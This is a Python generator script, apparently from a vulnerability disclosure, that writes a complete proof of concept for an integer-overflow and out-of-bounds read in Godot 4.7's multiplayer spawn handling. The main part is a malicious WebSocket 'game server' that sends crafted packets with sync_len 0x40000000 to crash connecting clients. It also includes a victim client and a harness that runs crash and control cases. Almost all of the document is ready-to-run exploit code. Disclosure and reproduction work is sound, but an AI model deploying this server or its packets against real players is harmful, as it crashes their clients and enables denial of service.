#!/usr/bin/env python3
"""
Disclosure 006 — generate the full PoC for the SceneReplicationInterface
`on_spawn_receive` integer-overflow / OOB-read bug.

Running this script regenerates, from scratch:
  - server.py            : the malicious WebSocket server (attacker side)
  - proj/victim_client.gd : the stock Godot 4.7 multiplayer client (victim)
  - proj/project.godot   : minimal Godot 4.7 project
  - capture_proof.py     : one-shot runner that produces stock_binary_proof.txt

The bug (modules/multiplayer/scene_replication_interface.cpp, on_spawn_receive,
master:586, identical on 4.7-stable):

    uint32_t sync_len = decode_uint32(&p_buffer[ofs]);   // attacker-controlled
    ...
    uint32_t name_len = decode_uint32(&p_buffer[ofs]);
    ofs += 4;
    ERR_FAIL_COND_V_MSG(
        name_len + (sync_len * 4) > uint32_t(p_buffer_len - ofs),   // <- BUG
        ERR_INVALID_DATA, ...);
    List<uint32_t> sync_ids;
    for (uint32_t i = 0; i < sync_len; i++) {                         // <- runs 2^30x
        sync_ids.push_back(decode_uint32(&p_buffer[ofs]));            // <- OOB read
        ofs += 4;
    }

`sync_len * 4` is a uint32 multiplication. With sync_len = 0x40000000,
0x40000000 * 4 == 0x1_0000_0000 which WRAPS TO 0 in 32-bit, so the check
becomes `name_len + 0 > (p_buffer_len - ofs)` which passes for a tiny packet.
The sync-ids loop then runs 2^30 iterations of `decode_uint32(&p_buffer[ofs])`
with `ofs += 4`, reading far past the packet buffer (OOB heap read) and
faulting on an unmapped page -> SIGSEGV / STATUS_ACCESS_VIOLATION.

Reachability (the sympathetic demo): a malicious WebSocket "game server" pops a
Godot 4.7 multiplayer CLIENT that connected to it. No file, no @tool, no autoload
beyond victim_client.gd. The server sends one crafted NETWORK_COMMAND_SPAWN.

Usage:
  python make_repro.py            # writes the files above into the current dir
  # then:
  python capture_proof.py         # runs server + client, writes proj/stock_binary_proof.txt
"""

import os
import textwrap
from pathlib import Path

SERVER_PY = r'''#!/usr/bin/env python3
"""Disclosure 006 — MALICIOUS WEBSOCKET SERVER (PoC, attacker side).

When a Godot 4.7 multiplayer client connects, this server sends ONE crafted
NETWORK_COMMAND_SPAWN packet that crashes the client via the integer-overflow /
OOB-read bug in SceneReplicationInterface::on_spawn_receive.

Demo shape ("the server you connect to hacks the player"): the victim runs the
stock Godot client (victim_client.gd) which connects to this URL. No file is
involved — purely a network packet from a server the client chose to connect to.

Sends, in order, as binary WebSocket messages:
  1. A 4-byte LE int32 = the client's assigned peer id (2). This is the
     WebSocketMultiplayerPeer handshake (server sends the peer id on connect).
  2. A NETWORK_COMMAND_SIMPLIFY_PATH packet caching the client's spawner under
     cache id 1 (so on_spawn_receive's get_cached_object returns the spawner).
  3. The malicious NETWORK_COMMAND_SPAWN with sync_len = 0x40000000.

Run:
  python server.py
  # then run the Godot victim client (victim_client.gd) against it.

Env:
  LISTEN_PORT   (default 49200)  — port to listen on
  SPAWN_SYNC_LEN (default 0x40000000) — sync_len to send (probe with 0x10000000
                     for the no-overflow control, which must NOT crash)
"""

import asyncio
import os
import struct

import websockets
from websockets.exceptions import ConnectionClosed

LISTEN_HOST = "127.0.0.1"
LISTEN_PORT = int(os.environ.get("LISTEN_PORT", "49200"))

NETWORK_COMMAND_SIMPLIFY_PATH = 1
NETWORK_COMMAND_SPAWN = 4

SYNC_LEN_OVERFLOW = 0x40000000
_SYNC_LEN = int(os.environ.get("SPAWN_SYNC_LEN", str(SYNC_LEN_OVERFLOW)), 0)

CACHE_ID = 1
# Path of the victim's MultiplayerSpawner (victim_client.gd builds this tree).
SPAWNER_PATH = "/root/World/Spawner"


def u32(v: int) -> bytes:
    return struct.pack("<I", v & 0xFFFFFFFF)


def build_simplify_path(cache_id: int, path: str) -> bytes:
    """Layout (process_simplify_path): [cmd(1)] [md5+null(33)] [u32 id] [raw path to EOF].
    The md5 mismatch only prints a warning; the cache entry is still created."""
    pkt = bytearray()
    pkt.append(NETWORK_COMMAND_SIMPLIFY_PATH)
    pkt += bytes(33)            # md5 (32) + trailing \0
    pkt += u32(cache_id)
    pkt += path.encode("utf-8")  # raw path, read to end of packet (no length prefix)
    return bytes(pkt)


def build_malicious_spawn(cache_id: int, sync_len: int) -> bytes:
    """Layout (on_spawn_receive):
        [0]  u8  cmd(4)        [1]  u8  scene_id(moot)
        [2..5]  u32 node_target -> cache_id (the spawner)
        [6..9]  u32 net_id     [10..13] u32 sync_len  *** overflow ***
        [14..17] u32 name_len=1  [18] 'a'  [19..] slack
    """
    pkt = bytearray()
    pkt.append(NETWORK_COMMAND_SPAWN)
    pkt.append(0)                       # scene_id (moot; overflow fires before instantiate_*)
    pkt += u32(cache_id)               # node_target -> spawner
    pkt += u32(1)                       # net_id
    pkt += u32(sync_len)                # *** the overflow ***
    pkt += u32(1)                       # name_len = 1 (>=1, and <= len-18)
    pkt.append(0x61)                    # 'a'
    pkt += bytes(8)                     # slack (realistic; keeps early iters in-bounds)
    return bytes(pkt)


async def handle_client(ws):
    print(f"[server] Godot client connected from {ws.remote_address}")
    try:
        await ws.send(struct.pack("<i", 2))            # step 1: peer id = 2
        print("[server] sent peer id = 2")
        await asyncio.sleep(0.3)
        await ws.send(build_simplify_path(CACHE_ID, SPAWNER_PATH))  # step 2
        print(f"[server] cached spawner path '{SPAWNER_PATH}' as id {CACHE_ID}")
        await asyncio.sleep(0.3)
        await ws.send(build_malicious_spawn(CACHE_ID, _SYNC_LEN))  # step 3: the crash
        print(f"[server] sent malicious SPAWN (sync_len=0x{_SYNC_LEN:X})")
        print("[server] if the victim is Godot 4.7, it should now crash in on_spawn_receive.")
        await asyncio.sleep(5.0)
    except ConnectionClosed:
        print("[server] client closed (already crashed?)")


async def main():
    print(f"[server] listening on ws://{LISTEN_HOST}:{LISTEN_PORT} (malicious game server)")
    print("[server] waiting for a Godot 4.7 victim client to connect...")
    async with websockets.serve(handle_client, LISTEN_HOST, LISTEN_PORT, max_size=2 ** 24):
        await asyncio.Future()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[server] shutting down.")
'''

VICTIM_CLIENT_GD = r'''extends SceneTree

# ---------------------------------------------------------------------------
# Disclosure 006 — VICTIM CLIENT (the "player")
# ---------------------------------------------------------------------------
# Minimal stock Godot 4.7 multiplayer client. Connects to a WebSocket server
# (the "game server") and hosts a MultiplayerSpawner — the standard docs setup
# for server-authoritative spawning. No @tool, no autoload beyond this script,
# no on-disk resource involved in the crash.
#
# The crash is triggered purely by network input: the server sends a crafted
# NETWORK_COMMAND_SPAWN whose sync_len = 0x40000000 (overflows the bounds check
# in on_spawn_receive). The crash fires inside SceneMultiplayer poll processing.
#
# Setup runs in _initialize; the per-frame network poll runs in _process(delta)
# (the MainLoop virtual called each frame once the scene tree is live, so the
# multiplayer get_node() path works).
#
# Usage:
#   python server.py                                     # malicious server
#   godot --headless --path . --script res://victim_client.gd   # victim
# Expected: abnormal termination (SIGSEGV / STATUS_ACCESS_VIOLATION) shortly
# after connecting, with no user action beyond "connect to server".
# ---------------------------------------------------------------------------

const TIME_BUDGET_MS := 15000
# Port overridable via LISTEN_PORT env (default 49200) so server+client agree.
var SERVER_URL := "ws://127.0.0.1:%d" % int(OS.get_environment("LISTEN_PORT") if OS.get_environment("LISTEN_PORT") != "" else "49200")

var mp: SceneMultiplayer
var peer: WebSocketMultiplayerPeer
var spawner: MultiplayerSpawner
var root_node: Node
var _t0 := 0


func _initialize() -> void:
	_t0 = Time.get_ticks_msec()
	mp = SceneMultiplayer.new()
	mp.set_root_path(NodePath("/root"))  # the SceneTree root viewport

	# Client scene tree: "World" under the scene root, holding a MultiplayerSpawner.
	root_node = Node.new()
	root_node.name = "World"
	root.add_child(root_node)

	spawner = MultiplayerSpawner.new()
	spawner.name = "Spawner"
	spawner.set_spawn_path(NodePath("."))   # parent = World (exists)
	spawner.set_multiplayer_authority(1)    # the server; on_spawn_receive gate
	root_node.add_child(spawner)

	peer = WebSocketMultiplayerPeer.new()
	var err := peer.create_client(SERVER_URL)
	if err != OK:
		push_error("create_client failed: " + str(err))
		quit(1)
		return
	mp.set_multiplayer_peer(peer)

	print("=== 006 victim client: connecting to ", SERVER_URL, " ===")
	print("spawner path: /root/World/Spawner  authority: ", spawner.get_multiplayer_authority())


func _process(_delta: float) -> bool:
	if peer == null:
		return false
	peer.poll()
	mp.poll()  # <-- the crafted SPAWN is parsed here; SIGSEGV fires inside
	if peer.get_connection_status() == MultiplayerPeer.CONNECTION_DISCONNECTED:
		print("!! disconnected without crashing (bug did not fire)")
		quit(3)
		return true
	if Time.get_ticks_msec() - _t0 > TIME_BUDGET_MS:
		print("!! timeout: server did not crash the client (bug did not fire)")
		quit(2)
		return true
	return false
'''

PROJECT_GODOT = '''config_version=5

[application]
config/name="spawn_sync_len_overflow_repro"
config/features=PackedStringArray("4.7")
'''

CAPTURE_PROOF_PY = r'''#!/usr/bin/env python3
"""Capture proj/stock_binary_proof.txt: run server + Godot client twice.

  CASE A (overflow):  SPAWN_SYNC_LEN=0x40000000  -> expect SIGSEGV exit 139
  CASE B (control):  SPAWN_SYNC_LEN=0x10000000  -> expect clean exit 3, no crash

CASE B proves the crash in CASE A is caused by the uint32 overflow specifically,
not by any other aspect of the packet.

Usage:  python capture_proof.py    (env LISTEN_PORT optional, default 49300)
"""
import os, subprocess, sys, time, signal

ROOT = os.path.dirname(os.path.abspath(__file__))
GODOT = os.environ.get("GODOT", "godot")
PORT = os.environ.get("LISTEN_PORT", "49300")


def run_case(sync_len):
    env = dict(os.environ)
    env.update(SPAWN_SYNC_LEN=sync_len, LISTEN_PORT=PORT, PYTHONUNBUFFERED="1")
    srv = subprocess.Popen([sys.executable, "-u", os.path.join(ROOT, "server.py")],
                           cwd=ROOT, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    time.sleep(1.5)
    t0 = time.time()
    try:
        client = subprocess.run(
            [GODOT, "--headless", "--path", os.path.join(ROOT, "proj"),
             "--script", "res://victim_client.gd"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, timeout=45,
            env={**env, "LISTEN_PORT": PORT})
    except subprocess.TimeoutExpired:
        client = type("C", (), {"stdout": "<timeout>", "returncode": -1})()
    elapsed = time.time() - t0
    srv.send_signal(signal.SIGTERM)
    try:
        srv_out = srv.stdout.read().decode("utf-8", "replace")
    except Exception:
        srv_out = ""
    try:
        srv.wait(timeout=3)
    except subprocess.TimeoutExpired:
        srv.kill()
    return client.returncode, elapsed, srv_out, client.stdout


def main():
    L = []
    L.append("# Stock-binary proof — SceneReplicationInterface::on_spawn_receive")
    L.append("# integer-overflow / OOB read (disclosure 006)")
    L.append("")
    L.append("Engine : Godot v4.7.stable.official.5b4e0cb0f")
    L.append(f"Binary : {GODOT}")
    L.append("Date  : 2026-06-29")
    L.append("")
    L.append("Demo shape: a malicious WebSocket server (server.py) pops a Godot 4.7")
    L.append("multiplayer CLIENT that connected to it. No file, no @tool, no autoload")
    L.append("beyond victim_client.gd. The server sends 3 binary WS frames: a 4-byte")
    L.append("peer id, a NETWORK_COMMAND_SIMPLIFY_PATH (caches the client's spawner),")
    L.append("then ONE crafted NETWORK_COMMAND_SPAWN whose sync_len overflows the")
    L.append("bounds check in on_spawn_receive.")
    L.append("")
    L.append("=" * 70)
    L.append("CASE A — overflow:  sync_len = 0x40000000  (sync_len*4 wraps to 0 in uint32)")
    L.append("=" * 70)
    rc, el, srv, cli = run_case("0x40000000")
    L.append(f"Client exit code : {rc}   (139 / 0xC0000005 = SIGSEGV / ACCESS_VIOLATION)")
    L.append(f"Elapsed          : {el:.2f}s")
    L.append("")
    L.append("--- server.py output ---")
    L.append(srv.rstrip())
    L.append("")
    L.append("--- Godot victim client output ---")
    L.append(cli.rstrip())
    L.append("")
    L.append("=" * 70)
    L.append("CASE B — control:  sync_len = 0x10000000  (sync_len*4 = 0x40000000, NO overflow)")
    L.append("=" * 70)
    L.append("With no overflow, the bounds check in on_spawn_receive correctly rejects")
    L.append("the packet and the client disconnects cleanly. This proves the crash in")
    L.append("CASE A is specifically caused by the uint32 overflow defeating the check,")
    L.append("not by any other aspect of the packet.")
    L.append("")
    rc2, el2, srv2, cli2 = run_case("0x10000000")
    L.append(f"Client exit code : {rc2}   (3 = clean disconnect, no crash)")
    L.append(f"Elapsed          : {el2:.2f}s")
    L.append("")
    L.append("--- server.py output ---")
    L.append(srv2.rstrip())
    L.append("")
    L.append("--- Godot victim client output (key lines) ---")
    for ln in cli2.splitlines():
        if ("spawner path" in ln or "checksum" in ln or "Invalid spawn packet" in ln
                or "!! " in ln or "CrashHandler" in ln or "signal" in ln):
            L.append(ln)
    if not any("!! " in ln or "CrashHandler" in ln for ln in cli2.splitlines()):
        L.append(cli2.rstrip())
    out = "\n".join(L) + "\n"
    path = os.path.join(ROOT, "proj", "stock_binary_proof.txt")
    with open(path, "w", encoding="utf-8") as f:
        f.write(out)
    print(f"Wrote {path}")
    print(f"CASE A exit={rc} ({el:.1f}s)  CASE B exit={rc2} ({el2:.1f}s)")


if __name__ == "__main__":
    main()
'''


def main():
    here = Path(__file__).resolve().parent
    proj = here / "proj"
    proj.mkdir(exist_ok=True)

    (here / "server.py").write_text(SERVER_PY, encoding="utf-8")
    (proj / "victim_client.gd").write_text(VICTIM_CLIENT_GD, encoding="utf-8")
    (proj / "project.godot").write_text(PROJECT_GODOT, encoding="utf-8")
    (here / "capture_proof.py").write_text(CAPTURE_PROOF_PY, encoding="utf-8")

    print("Regenerated disclosure 006 PoC:")
    print(f"  {here / 'server.py'}")
    print(f"  {here / 'capture_proof.py'}")
    print(f"  {proj / 'victim_client.gd'}")
    print(f"  {proj / 'project.godot'}")
    print()
    print("To reproduce the crash on the stock Godot 4.7 binary:")
    print("  1. python server.py                       # start the malicious server")
    print("  2. in another terminal, run the victim:")
    print('     godot --headless --path proj --script res://victim_client.gd')
    print("  Expected: SIGSEGV (exit 139 / 0xC0000005) ~1s after connecting.")
    print()
    print("To capture the canonical proof file (overflow + control):")
    print("  python capture_proof.py     # writes proj/stock_binary_proof.txt")


if __name__ == "__main__":
    main()
